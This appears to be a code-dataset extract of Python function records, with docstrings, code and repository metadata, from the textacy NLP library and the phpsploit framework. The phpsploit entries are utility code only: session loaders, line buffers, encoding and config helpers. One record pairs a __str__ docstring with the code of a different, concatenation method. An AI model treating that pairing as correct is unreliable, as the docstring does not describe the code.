{"docstring": "\"\"\"\nArgs:\n    cands (List[obj])\n    num (int or float)\n\nReturns:\n    List[obj]\n\"\"\"\n", "func_signal": "def _select_random_candidates(cands, num):\n", "code": "if isinstance(num, int) and num >= 0:\n    rand_cands = random.sample(cands, min(num, len(cands)))\nelif isinstance(num, float) and 0.0 <= num <= 1.0:\n    rand_cands = [cand for cand in cands if random.random() < num]\nelse:\n    raise ValueError(\n        f\"num={num} is invalid; must be an int >= 0 or a float in [0.0, 1.0]\"\n    )\nreturn rand_cands", "path": "textacy/src/textacy/augmentation/transforms.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "# NOTE: this is awkward, and it seems like there should be a better way\n", "func_signal": "def test_basics_attrs(ts_en, ts_es, lang, attr_name, attr_type, attr_subtype, exp_val):\n", "code": "ts = ts_en if lang == \"en\" else ts_es\nassert hasattr(ts, attr_name)\nobs_val = getattr(ts, attr_name)\nassert isinstance(obs_val, attr_type)\nif attr_subtype is not None:\n    assert all(isinstance(ov, attr_subtype) for ov in obs_val)\nif exp_val is not None:\n    if attr_type is float:\n        assert obs_val == pytest.approx(exp_val, rel=1e-2)\n    else:\n        assert obs_val == exp_val", "path": "textacy/tests/text_stats/test_api.py", "commit_date": "2020-11-01 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "# for performance reasons, only iterate over files that are requested\n", "func_signal": "def __iter__(self):\n", "code": "if self._date_range is not None:\n    filepaths = [\n        self.data_dir.joinpath(filestub)\n        for filestub in self._generate_filestubs(self._date_range)\n    ]\n    for filepath in filepaths:\n        if not filepath.is_file():\n            raise OSError(\n                f\"requested comments file {filepath} not found;\\n\"\n                \"has the dataset been downloaded yet?\"\n            )\nelse:\n    filepaths = self.filepaths\n    if not filepaths:\n        raise OSError(\n            f\"no comments files found in {self.data_dir} directory;\\n\"\n            \"has the dataset been downloaded yet?\"\n        )\n\nfor filepath in filepaths:\n    for line in tio.read_json(filepath, mode=\"rb\", lines=True):\n        line[\"created_utc\"] = self._convert_timestamp(\n            line.get(\"created_utc\", \"\")\n        )\n        line[\"retrieved_on\"] = self._convert_timestamp(\n            line.get(\"retrieved_on\", \"\")\n        )\n        line[\"body\"] = self._clean_content(line[\"body\"])\n        yield line", "path": "textacy/src/textacy/datasets/reddit_comments.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nDict[str, Dict[str, float]]: Mapping of term string (or term#POS,\nif :attr:`DepecheMood.word_rep` is \"lemmapos\") to the terms' normalized weights\non a fixed set of affective dimensions (aka \"emotions\").\n\"\"\"\n", "func_signal": "def weights(self):\n", "code": "if not self._weights:\n    if not self.filepath:\n        raise OSError(\n            \"resource file {} not found;\\n\"\n            \"has the data been downloaded yet?\".format(self._filepath)\n        )\n    with io.open(self.filepath, mode=\"rt\", encoding=\"utf-8\") as csvfile:\n        csv_reader = csv.reader(csvfile, delimiter=\"\\t\")\n        rows = list(csv_reader)\n    cols = rows[0]\n    self._weights = {\n        row[0]: {col: float(val) for col, val in zip(cols[1:-1], row[1:-1])}\n        for row in rows[1:]\n        if int(row[-1]) >= self.min_freq\n    }\nreturn self._weights", "path": "textacy/src/textacy/resources/depeche_mood.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nFull path on disk for SupremeCourt data as compressed json file.\n``None`` if file is not found, e.g. has not yet been downloaded.\n\"\"\"\n", "func_signal": "def filepath(self) -> Optional[str]:\n", "code": "if self._filepath.is_file():\n    return str(self._filepath)\nelse:\n    return None", "path": "textacy/src/textacy/datasets/supreme_court.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nFull paths on disk for all Reddit comments files found under\n:attr:`RedditComments.data_dir` directory, sorted in chronological order.\n\"\"\"\n", "func_signal": "def filepaths(self) -> Tuple[str, ...]:\n", "code": "if self.data_dir.is_dir():\n    return tuple(\n        sorted(\n            tio.get_filepaths(\n                self.data_dir,\n                match_regex=r\"RC_\\d{4}\",\n                extension=\".bz2\",\n                recursive=True,\n            )\n        )\n    )\nelse:\n    return tuple()", "path": "textacy/src/textacy/datasets/reddit_comments.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "# this dataset is unusual in that the only filter we can really offer is lang\n# so we might as well avoid loading texts in unwanted languages\n", "func_signal": "def _filtered_iter(self, lang):\n", "code": "if lang:\n    self._check_data()\n    lang = utils.validate_set_members(lang, str, valid_vals=self.langs)\n    for item in self.index:\n        if item[\"lang\"] in lang:\n            filepath = self._texts_dirpath.joinpath(item[\"filename\"])\n            record = item.copy()\n            record[\"text\"] = self._load_and_parse_text_file(filepath)\n            yield record\nelse:\n    for record in self:\n        yield record", "path": "textacy/src/textacy/datasets/udhr.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nRead in index xml file from :attr:`UDHR._index_filepath`; skip elements\nwithout valid ISO-639-1 language code or sufficient translation quality,\nthen convert into a list of dicts with key metadata, including filenames.\n\"\"\"\n", "func_signal": "def _load_and_parse_index(self):\n", "code": "index = []\ntree = xml.etree.ElementTree.parse(self._index_filepath)\nroot = tree.getroot()\nfor ele in root.iterfind(\"udhr\"):\n    iso_lang_code = ele.get(\"bcp47\", \"\").split(\"-\", 1)[0]\n    stage = int(ele.get(\"stage\"))\n    if len(iso_lang_code) != 2 or stage < 3:\n        continue\n    else:\n        index.append(\n            {\n                \"filename\": f\"udhr_{ele.get('f')}.txt\",\n                \"lang\": iso_lang_code,\n                \"lang_name\": ele.get(\"n\"),\n            }\n        )\n# get set of all available langs, so users can filter on it\nself.langs = {item[\"lang\"] for item in index}\nreturn index", "path": "textacy/src/textacy/datasets/udhr.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nRecursively find the actual size of an object, in bytes.\n\nTaken as-is (with tweaked function name) from https://github.com/bosswissam/pysize.\n\"\"\"\n", "func_signal": "def _get_size(obj, seen=None):\n", "code": "size = sys.getsizeof(obj)\nif seen is None:\n    seen = set()\nobj_id = id(obj)\nif obj_id in seen:\n    return 0\n# Important mark as seen *before* entering recursion to gracefully handle\n# self-referential objects\nseen.add(obj_id)\nif hasattr(obj, \"__dict__\"):\n    for cls in obj.__class__.__mro__:\n        if \"__dict__\" in cls.__dict__:\n            d = cls.__dict__[\"__dict__\"]\n            if inspect.isgetsetdescriptor(d) or inspect.ismemberdescriptor(d):\n                size += _get_size(obj.__dict__, seen)\n            break\nif isinstance(obj, dict):\n    size += sum((_get_size(v, seen) for v in obj.values()))\n    size += sum((_get_size(k, seen) for k in obj.keys()))\nelif hasattr(obj, \"__iter__\") and not isinstance(obj, (str, bytes, bytearray)):\n    size += sum((_get_size(i, seen) for i in obj))\nreturn size", "path": "textacy/src/textacy/cache.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"Clear textacy's cache of loaded data.\"\"\"\n", "func_signal": "def clear():\n", "code": "global LRU_CACHE\nLRU_CACHE.clear()", "path": "textacy/src/textacy/cache.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "# strip out link markup, e.g. [foo](http://foo.com)\n", "func_signal": "def _clean_content(self, content):\n", "code": "content = RE_REDDIT_LINK.sub(r\"\\1\", content)\n# clean up basic HTML cruft\ncontent = content.replace(\"&gt;\", \">\").replace(\"&lt;\", \"<\")\n# strip out text markup, e.g. * for bold text\ncontent = content.replace(\"`\", \"\").replace(\"*\", \"\").replace(\"~\", \"\")\n# normalize whitespace\nreturn constants.RE_NONBREAKING_SPACE.sub(\n    \" \", constants.RE_LINEBREAK.sub(r\"\\n\", content)\n).strip()", "path": "textacy/src/textacy/datasets/reddit_comments.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nArgs:\n    term (Sequence[str] or Sequence[:class:`spacy.tokens.Token`])\n\nReturns:\n    Dict[str, float]\n\"\"\"\n", "func_signal": "def _get_terms_emotional_valence(self, terms):\n", "code": "all_emo_weights = collections.defaultdict(list)\nfor term in terms:\n    emo_weights = self._get_term_emotional_valence(term)\n    for emo, weight in emo_weights.items():\n        all_emo_weights[emo].append(weight)\nreturn {\n    emo: statistics.mean(weights) for emo, weights in all_emo_weights.items()\n}", "path": "textacy/src/textacy/resources/depeche_mood.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nstr: Full path on disk for the DepecheMood tsv file\ncorresponding to the ``lang`` and ``word_rep``.\n\"\"\"\n", "func_signal": "def filepath(self):\n", "code": "if self._filepath.is_file():\n    return str(self._filepath)\nelse:\n    return None", "path": "textacy/src/textacy/resources/depeche_mood.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nArgs:\n    term (str or :class:`spacy.tokens.Token`)\n\nReturns:\n    Dict[str, float]\n\"\"\"\n", "func_signal": "def _get_term_emotional_valence(self, term):\n", "code": "try:\n    if isinstance(term, str):\n        return self.weights[term]\n    elif isinstance(term, Token):\n        if self.word_rep == \"lemmapos\":\n            return self.weights[\n                \"{}#{}\".format(term.lemma_, self._pos_map[term.pos])\n            ]\n        elif self.word_rep == \"lemma\":\n            return self.weights[term.lemma_]\n        else:  # word_rep == \"token\"\n            return self.weights[term.text]\n    else:\n        raise TypeError(\n            \"`term` must be of type {}, not {}\".format({str, Token}, type(term))\n        )\nexcept KeyError:\n    return {}", "path": "textacy/src/textacy/resources/depeche_mood.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "# NOTE: this is awkward, and it seems like there should be a better way\n", "func_signal": "def test_readability_attrs(ts_en, ts_es, lang, attr_name, exp_val):\n", "code": "ts = ts_en if lang == \"en\" else ts_es\nassert hasattr(ts, attr_name)\nassert getattr(ts, attr_name) == pytest.approx(exp_val, rel=0.05)", "path": "textacy/tests/text_stats/test_api.py", "commit_date": "2020-11-01 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nGenerate a list of monthly filepath stubs in the interval [start, end),\neach with format \"YYYY/RC_YYYY-MM.bz2\".\n\"\"\"\n", "func_signal": "def _generate_filestubs(self, date_range):\n", "code": "fstubs = []\nstart = self._parse_date(date_range[0])\nend = self._parse_date(date_range[1])\nfor tot_mo in range(self._total_mos(start) - 1, self._total_mos(end) - 1):\n    yr, mo = divmod(tot_mo, 12)\n    fstubs.append(datetime(yr, mo + 1, 1).strftime(\"%Y/RC_%Y-%m.bz2\"))\nreturn tuple(fstubs)", "path": "textacy/src/textacy/datasets/reddit_comments.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"dt (str) => datetime\"\"\"\n", "func_signal": "def _parse_date(self, dt):\n", "code": "try:\n    return datetime.strptime(dt, \"%Y-%m\")\nexcept ValueError:\n    return datetime.strptime(dt, \"%Y-%m-%d\")", "path": "textacy/src/textacy/datasets/reddit_comments.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"\nDownload resource data as a zip archive file, then save it to disk\nand extract its contents under the ``data_dir`` directory.\n\nArgs:\n    force (bool): If True, download the resource, even if it already\n        exists on disk under ``data_dir``.\n\"\"\"\n", "func_signal": "def download(self, *, force=False):\n", "code": "filepath = tio.download_file(\n    DOWNLOAD_URL, filename=None, dirpath=self.data_dir, force=force,\n)\nif filepath:\n    tio.unpack_archive(filepath, extract_dir=None)", "path": "textacy/src/textacy/resources/depeche_mood.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"Conf object setter\"\"\"\n", "func_signal": "def set_conf(self, old_session):\n", "code": "result = old_session[\"SET\"]\n\n# $EDITOR\nrename_key(result, \"TEXTEDITOR\", \"EDITOR\")\n\n# $BROWSER\nrename_key(result, \"WEBBROWSER\", \"BROWSER\")\n\n# $HTTP_USER_AGENT\nif \"HTTP_USER_AGENT\" in result.keys():\n    old_defaults = [\"file://misc/http/User-Agent.lst\",\n                    \"file://framework/misc/http_user_agents.lst\"]\n    if result[\"HTTP_USER_AGENT\"] in old_defaults:\n        del result[\"HTTP_USER_AGENT\"]\n\n# $SAVEFILE\nremove_key(result, \"SAVEFILE\")\n\nreturn result", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Get a colored string representation of current object\n\n>>> MultiLineBuffer(\"monoline\")\nmonoline\n>>> MultiLineBuffer(\"file:///etc/passwd\")\n<MultiLine@/etc/passwd (24 lines)>\n>>> MultiLineBuffer(\"line1\\\\nline2\")\n<MultiLine (2 lines)>\n\"\"\"\n\n", "func_signal": "def __str__(self):\n", "code": "\n\"\"\"allow strings being concatenated to the end of buffer.\nIf string starts with 'file://', suffix is used as new\n*parent-filepath\n\n>>> x = MultiLineBuffer(\"choice1\")\n>>> x\nchoice1\n>>> x += \"choice2\"\n>>> x += \"file:///tmp/foo\"\n>>> x\n<MultiLine@/tmp/foo (2 choices)>\n\"\"\"\nif not isinstance(new, str):\n    msg = \"Can't convert '{}' object to str implicitly\"\n    raise TypeError(msg.format(type(new).__name__))\n\nnew += os.linesep\n# if string starts with 'file://', use it as *parent-filepath\nlines = len(new.splitlines())\nif lines == 1 and new[7:] and new[:7] == \"file://\":\n    result = self.__class__(self.buffer, self._validator)\n    result.file = new[7:].strip()\n    return result\n# otherwise, concatenate normal string to buffer\nbuffer = self.buffer\nif buffer[-1] not in \"\\r\\n\":\n    buffer += os.linesep\nbuffer += new\nreturn self.__class__(buffer, self._validator)", "path": "phpsploit/src/linebuf.py", "commit_date": "2019-02-10 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Decode the given bytes object with `encoding` decoder\nand `errors` error handler.\nIf not set, `encoding` defaults to module's `default_encoding` variable.\nIf not set, `errors` defaults to module's `default_errors` variable.\n\"\"\"\n", "func_signal": "def decode(bytes_obj, encoding=default_encoding, errors=default_errors):\n", "code": "str_obj = bytes_obj.decode(encoding, errors)\nreturn str_obj", "path": "phpsploit/src/core/encoding.py", "commit_date": "2014-11-09 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Get a random *usable-value from buffer lines.\n\n`call` (bool): If True, and *usable-value is callable,\nreturn called *usable-value\n\"\"\"\n", "func_signal": "def __call__(self, call=True):\n", "code": "obj = random.choice(self.choices())\nif call and callable(obj):\n    return obj()\nreturn obj", "path": "phpsploit/src/linebuf.py", "commit_date": "2019-02-10 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Get a colored string representation of current object\n\n>>> RandLineBuffer(\"singleChoice\")\nsingleChoice\n>>> RandLineBuffer(\"file:///etc/passwd\")\n<RandLine@/etc/passwd (24 choices)>\n>>> RandLineBuffer(\"choice1\\\\nchoice2\")\n<RandLine (2 choices)>\n\"\"\"\n# if buffer has a single line, use it as representation:\n", "func_signal": "def __str__(self):\n", "code": "if not self.file and len(self.buffer.splitlines()) == 1:\n    return str(self._validator(self.buffer.strip()))\n# otherwise, use complex representation:\nobj_id = self.file\nif not obj_id:\n    obj_id = hashlib.md5(self.buffer.encode('utf-8')).hexdigest()\nnum = len(self.choices())\nchoices = \" (%s choice%s)\" % (num, ('', 's')[num > 1])\nreturn colorize(\"%BoldBlack\", \"<\", \"%BoldBlue\", \"RandLine\",\n                \"%BasicCyan\", \"@\", \"%Bold\", obj_id, \"%BasicBlue\",\n                choices, \"%BoldBlack\", \">\")", "path": "phpsploit/src/linebuf.py", "commit_date": "2019-02-10 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"dump object as an iterable of the form:\n[*parent-filepath, *buffer-data]\n\n>>> tuple(MultiLineBuffer([\"/file/path\", \"buffer\"])\n(\"/file/path\", \"buffer\")\n\"\"\"\n", "func_signal": "def __getitem__(self, item):\n", "code": "if item in [0, \"file\"]:\n    return self.file\nif item in [1, \"buffer\"]:\n    return self.buffer\nraise IndexError(self.__class__.__name__+\" index out of range\")", "path": "phpsploit/src/linebuf.py", "commit_date": "2019-02-10 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Encode the given bytes object with `encoding` encoder\nand `errors` error handler.\nIf not set, `encoding` defaults to module's `default_encoding` variable.\nIf not set, `errors` defaults to module's `default_errors` variable.\n\"\"\"\n", "func_signal": "def encode(str_obj, encoding=default_encoding, errors=default_errors):\n", "code": "bytes_obj = str_obj.encode(encoding, errors)\nreturn bytes_obj", "path": "phpsploit/src/core/encoding.py", "commit_date": "2014-11-09 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Get a colored string representation of current object\n\n>>> MultiLineBuffer(\"monoline\")\nmonoline\n>>> MultiLineBuffer(\"file:///etc/passwd\")\n<MultiLine@/etc/passwd (24 lines)>\n>>> MultiLineBuffer(\"line1\\\\nline2\")\n<MultiLine (2 lines)>\n\"\"\"\n# if buffer has a single line, use it as representation:\n", "func_signal": "def __str__(self):\n", "code": "if not self.file and len(self.buffer.splitlines()) == 1:\n    return str(self._validator(self.buffer.strip()))\n# otherwise, use complex representation:\nobj_id = self.file\nif not obj_id:\n    obj_id = hashlib.md5(self.buffer.encode('utf-8')).hexdigest()\nlines_str = \" (%s lines)\" % len(self.buffer.splitlines())\nreturn colorize(\"%BoldBlack\", \"<\", \"%BoldBlue\", \"MultiLine\",\n                \"%BasicCyan\", \"@\", \"%Bold\", obj_id, \"%BasicBlue\",\n                lines_str, \"%BoldBlack\", \">\")", "path": "phpsploit/src/linebuf.py", "commit_date": "2019-02-10 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Env object setter\"\"\"\n", "func_signal": "def set_env(self, old_session):\n", "code": "result = old_session[\"ENV\"]\n\nrename_key(result, \"CWD\", \"PWD\")\nrename_key(result, \"WRITE_TMPDIR\", \"WRITEABLE_TMPDIR\")\nrename_key(result, \"WRITE_WEBDIR\", \"WRITEABLE_WEBDIR\")\n\nremove_key(result, \"TEXTEDITOR\")\n\n# Add some environment variables from old \"SERVER\" object.\nresult[\"ADDR\"] = old_session[\"SERVER\"][\"addr\"]\nresult[\"HOME\"] = old_session[\"SERVER\"][\"home\"]\nresult[\"HOST\"] = old_session[\"SERVER\"][\"host\"]\nresult[\"PHP_VERSION\"] = old_session[\"SERVER\"][\"phpver\"]\nresult[\"PATH_SEP\"] = old_session[\"SERVER\"][\"separator\"]\nresult[\"HTTP_SOFTWARE\"] = old_session[\"SERVER\"][\"soft\"]\nresult[\"USER\"] = old_session[\"SERVER\"][\"user\"]\nresult[\"CLIENT_ADDR\"] = old_session[\"SERVER\"][\"client_addr\"]\n\n# $PLATFORM\nresult[\"PLATFORM\"] = old_session[\"SERVER\"][\"os\"].split()[0].lower()\nif result[\"PLATFORM\"] in [\"unknow\", \"unknown\", \"\"]:\n    if result[\"PATH_SEP\"] == \"\\\\\":\n        result[\"PLATFORM\"] = \"windows\"\n    else:\n        result[\"PLATFORM\"] = \"unix\"\n\nreturn result", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Add user configuration dir's default content.\"\"\"\n\n# create default $USERDIR/config if it doesn't exist\n", "func_signal": "def fill(self):\n", "code": "config = utils.path.truepath(self.path, \"config\")\nif not os.path.isfile(config):\n    with open(BASEDIR + \"data/config/config\") as file:\n        default_config = file.read()\n    with open(config, 'w') as file:\n        file.write(default_config)\n\n# always override $USERDIR/README\nwith open(BASEDIR + \"data/config/README\") as file:\n    readme = file.read()\nwith open(utils.path.truepath(self.path, \"README\"), \"w\") as file:\n    file.write(readme)\n\n# create $USERDIR/plugins/ it doesn;t exist\ndirs = [\"plugins\"]\nfor elem in dirs:\n    elem = utils.path.truepath(self.path, elem)\n    try:\n        os.mkdir(elem)\n    except OSError as e:\n        if e.errno != errno.EEXIST or not os.path.isdir(elem):\n            raise e", "path": "phpsploit/src/core/config.py", "commit_date": "2019-02-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"default file loader\n\"\"\"\n", "func_signal": "def _load_file(self, session_path):\n", "code": "with open(session_path, 'rb') as file:\n    return pickle.load(file,\n                       encoding=encoding.default_encoding,\n                       errors=encoding.default_errors)", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Get phpsploit configuration directory,\nby checking, in this order of preference:\n  - $PHPSPLOIT_CONFIG_DIR/ (only if env var exists)\n  - $XDG_CONFIG_HOME/phpsploit/ (only if env var exists)\n  - ~/.config/phpsploit/\n  - ~/.phpsploit/\n\nIf non of the above exist, directory creation is attempted\nwith the same order of preference. Directory creation is not\nrecursive, to parent directory must exist.\n\nIf USERDIR cannot be determined, a ValueError mentioning\nlast tried choice (~/.phpsploit/) is raised.\n\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "if os.environ.get(\"XDG_CONFIG_HOME\"):\n    self.choices.insert(0, \"$XDG_CONFIG_HOME/phpsploit\")\n\nif os.environ.get(\"PHPSPLOIT_CONFIG_DIR\"):\n    self.choices.insert(0, \"$PHPSPLOIT_CONFIG_DIR/\")\n\nself.choices = [utils.path.truepath(c) for c in self.choices]\n\n# try to find existing USERDIR\nfor choice in self.choices:\n    try:\n        self.path = Path(choice, mode=\"drw\")()\n        break\n    except ValueError:\n        pass\n\n# try to create new valid USERDIR\nif self.path is None:\n    for choice in self.choices:\n        try:\n            os.mkdir(choice)\n        except OSError:\n            pass\n        try:\n            self.path = Path(choice, mode=\"drw\")\n            break\n        except ValueError as e:\n            if choice == self.choices[-1]:\n                raise e\n\nself.fill()  # finally, fill it with default content", "path": "phpsploit/src/core/config.py", "commit_date": "2019-02-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Successively try to load session file\nwith the list of compat session loaders.\n\nThe list `compat_loaders` must be sorted starting\nwith most recent loader\n\"\"\"\n", "func_signal": "def load(session_path):\n", "code": "compat_loaders = [Loader_V2_1_4(), Loader_V1_x()]\n\nfor old_session_load in compat_loaders:\n    try:\n        return old_session_load(session_path)\n    except BaseException:\n        pass", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Get current buffer's *usable-value\n\n`call` (bool): If True, and *usable-value is callable,\nreturn called *usable-value\n\"\"\"\n", "func_signal": "def __call__(self, call=True):\n", "code": "usable_value = self._validator(self.buffer)\nif call and callable(usable_value):\n    return usable_value()\nreturn usable_value", "path": "phpsploit/src/linebuf.py", "commit_date": "2019-02-10 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Env object setter\"\"\"\n", "func_signal": "def set_env(self, old_session):\n", "code": "result = old_session[\"ENV\"]\n\nrename_key(result, \"CWD\", \"PWD\")\nrename_key(result, \"WRITE_TMPDIR\", \"WRITEABLE_TMPDIR\")\nrename_key(result, \"WRITE_WEBDIR\", \"WRITEABLE_WEBDIR\")\n\nremove_key(result, \"TEXTEDITOR\")\n\n# Add some environment variables from old \"SRV\" object.\nresult[\"ADDR\"] = old_session[\"SRV\"][\"addr\"]\nresult[\"HOME\"] = old_session[\"SRV\"][\"home\"]\nresult[\"HOST\"] = old_session[\"SRV\"][\"host\"]\nresult[\"PHP_VERSION\"] = old_session[\"SRV\"][\"phpver\"]\nresult[\"PATH_SEP\"] = old_session[\"SRV\"][\"separator\"]\nresult[\"HTTP_SOFTWARE\"] = old_session[\"SRV\"][\"soft\"]\nresult[\"USER\"] = old_session[\"SRV\"][\"user\"]\nresult[\"WEB_ROOT\"] = old_session[\"SRV\"][\"webroot\"]\nresult[\"CLIENT_ADDR\"] = old_session[\"SRV\"][\"client_addr\"]\n\n# $PLATFORM\nresult[\"PLATFORM\"] = old_session[\"SRV\"][\"os\"].split()[0].lower()\nif result[\"PLATFORM\"] in [\"unknow\", \"unknown\", \"\"]:\n    if result[\"PATH_SEP\"] == \"\\\\\":\n        result[\"PLATFORM\"] = \"windows\"\n    else:\n        result[\"PLATFORM\"] = \"unix\"\n\nreturn result", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"load file & check PSCOREVER\"\"\"\n", "func_signal": "def _load_file(self, session_path):\n", "code": "old_session = super()._load_file(session_path)\nif int(old_session[\"PSCOREVER\"]) != 2:\n    raise ValueError(\"PSCOREVER must be 2\")\nreturn old_session", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Get raw session object from `session_path`.\n\"\"\"\n", "func_signal": "def __call__(self, session_path):\n", "code": "new_session = copy.deepcopy(self._template)\nsession_keys = new_session.keys()\nold_session = self._load_file(session_path)\nfor attribute in dir(self):\n    if attribute.startswith(\"set_\"):\n        target = attribute[4:].capitalize()\n        if target not in session_keys:\n            raise ValueError(\"Invalid attribute: %r\" % attribute)\n        function = getattr(self, attribute)\n        new_session[target] = function(old_session)\nreturn new_session", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "# a boring Mas OS/X case ..\n", "func_signal": "def __new__(cls, name):\n", "code": "blacklist = ['macosx']\n\nlst = [x for x in webbrowser._browsers.keys() if x not in blacklist]\nlst.append(\"disabled\")\nlst_repr = repr(lst)[1:-1]\n\nif len(lst) < 2 or name == \"disabled\":\n    if name not in lst + [\"\", \"default\"]:\n        raise ValueError(\"Can't bind to \u00ab%s\u00bb. Valid choices: %s\"\n                % (name, lst_repr))\n    return str.__new__(cls, \"disabled\")\n\ntry:\n    if name.lower() in [\"\", \"default\"]:\n        name = webbrowser.get().name\n    else:\n        webbrowser.get(name)\n# another boring Mac OS/X case ..\nexcept AttributeError:\n    return str.__new__(cls, \"default\")\nexcept:\n    raise ValueError(\"Can't bind to \u00ab%s\u00bb. Valid choices: %s\"\n            % (name, lst_repr))\nreturn str.__new__(cls, name)", "path": "phpsploit/src/datatypes/WebBrowser.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\"Remove `keyname` from `dictionnary` if it exists.\n\n\"\"\"\n", "func_signal": "def remove_key(dictionnary, keyname):\n", "code": "if keyname in dictionnary.keys():\n    del dictionnary[keyname]", "path": "phpsploit/src/core/session/compat_session.py", "commit_date": "2020-10-13 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
